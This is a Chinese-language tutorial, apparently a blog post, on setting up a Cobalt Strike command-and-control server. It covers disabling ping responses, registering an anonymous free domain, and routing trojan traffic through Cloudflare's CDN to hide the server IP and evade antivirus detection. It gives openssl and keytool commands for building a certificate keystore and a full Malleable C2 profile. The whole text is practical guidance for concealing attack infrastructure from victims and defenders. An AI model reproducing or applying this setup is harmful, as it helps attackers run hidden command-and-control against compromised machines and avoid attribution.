## 一、CS服务端配置

    上传CS到服务器，配置java环境、禁ping、修改默认端口、修改客户端连接证书。

### 1.1 服务器禁ping

    当服务器禁ping后，从某种角度可以判定为主机为不存活状态，可以有一定的作用。

编辑文件/etc/sysctl.conf，在里面增加一行。  
`net.ipv4.icmp_echo_ignore_all=1`  
之后使命命令`sysctl -p`使配置生效

![](../Images/203c1083997e9fd52b988e7d6daa3dc2.png)

之后在ping就无法ping通了。

### 1.2 修改端口

## 二、使用CDN隐藏

    cs生成的木马中会带有服务器的部分信息如IP、域名，直接在win的任务资源管理器中就可以看到木马当前到通信IP，IP泄漏后可能会被标记，或者有概率被反制，泄漏了使用的云服务商其实也是有一定的风险的，使用cdn就可以很好的隐藏住这部分信息，并且在一定程度上可以规避杀毒软件的主机特征查杀。并且在其他大佬的文章中看到https的监听方式中不会采用cobaltstrike.store的密钥库。所以这里申请一个证书代替https监听方式中的默认证书。

  

### 2.1 申请域名

    首先要准备一个域名，具体哪个平台不做太多要求，但是最好是匿名的不需要备案的那种，不然域名被查到这些也是没有太大意义的。

我用的是Freenom，是免费的（链接;https://www.freenom.com/zh/index.html）

    可以在搜索框中搜索自己想要的域名，没有被注册的话就可以在免费的里面选一个注册；详细教程请看知乎：https://zhuanlan.zhihu.com/p/115535965

    注册域名后讲DNS解析转到我们的CDN平台:https://www.cloudflare.com/zh-cn/cdn/  

    CDN服务选择0元的免费服务。

### 2.2 CDN配置

   1、设置好后进入CDN开启开发者模式  

![](../Images/97a6935bd1ddc1d1c78801b9ee349178.png)

2、关闭自动https重写和始终使用https、broti压缩

![](../Images/168fe7470794e17347760d0e71b06661.png)

3、设置域名解析到VPS上。  

![](../Images/03d9aa9d2003d0e34fa0eb6d7c373e27.png)

4、配置SSL/TLS加密模式为完全。

![](../Images/998177b6827eb0c93ccd90bec1943d6b.png)

  

  

5、cloudflare生成证书，在cloudflare的dash页面找到SSL/TLS->源服务器->创建证书，之后将公钥和私钥保存下来，分别为server.pem和server.key。一定要在生成的时候保存，不然可能找不到私钥了。

6、将申请到证书打包成密钥包：openssl pkcs12 -export -in server.pem -inkey server.key -out test.com.p12 -name test.com -passout pass:123456     -----打包成p12的包（证书中不能有换行，否则会报错）

keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore test.com.store -srckeystore test.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias test.com    -----生成store文件

7、配置证书到https的监听方式中。要想使用我们自己申请的证书，这里就需要使用‘Malleable C2 profile’的方式来操作。这里以cloudflare.profile为例。将生成的密钥文件.store放到cs目录下，在cloudflare.profile加入证书配置：其中需要注意的是https-certificate为证书相关的配置，其他client.header中Host的值要为我们申请的域名，其他的部分，根据个人情况去配置。

（这里我贴出我测试用的profile）  

\------------------------------------------------------------------------------------

https-certificate {

    set keystore "test.com.store";#证书的位置

    set password "123456";#证书的密码

}

http-stager {

    set uri\_x86 "/api/1";

    set uri\_x64 "/api/2";

    client {

        header "Host" "test.com";}

    server {

        output{

        print;

        }

    }

        }

http-get {

    set uri "/api/3";

    client {

        header "Host" "test.com";

        metadata {

            base64;

            header "Cookie";

        }

        }

    server {

        output{

        print;

        }

    }

        }

http-post {

    set uri "/api/4";

    client {

        header "Host" "test.com";

        id {

            uri-append;

        }

        output{

        print;

        }

    }

    server {

        output{

        print;

        }

    }

}

\---------------------------------------------------------------------------
